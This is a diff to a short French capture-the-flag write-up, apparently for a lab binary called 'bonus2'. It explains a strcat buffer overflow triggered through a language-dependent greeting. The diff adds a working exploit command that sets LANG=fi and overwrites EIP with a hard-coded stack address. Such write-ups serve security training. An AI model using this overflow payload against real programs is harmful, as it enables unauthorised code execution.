@@ -3,9 +3,10 @@ la faille vient du faite que l'on fasse un strcat de "Bonjour " en differente la
 
 les 40 premiers carateres de av[1] suivit de 40 - strlen(av[1]) '\0' puis des 32 premier carateres de av[2]
 
-Soit 18 + 40 + 32 + 1 = 91 carateres max ("Goedemiddag! " + 'a' * 40 + 'b' * 32 + '\0') dans un buff qui ne peut contenir que 72 caraters
+Soit 18 + 40 + 32 + 1 = 91 carateres max ("Hyvää päivää " + 'a' * 40 + 'b' * 32 + '\0') dans un buff qui ne peut contenir que 72 caraters
 On peut par consequent faire un buffeur overflow
 
 En ecrivant l'addresse au bonn endroit on peut reecrire eip
 
+LANG=fi
 /home/user/bonus2/bonus2 `python -c "print 'a' * 40"` `python -c "print 'b' * 18 + '\xdc\xfe\xff\xbf' + 'd' * 10"`
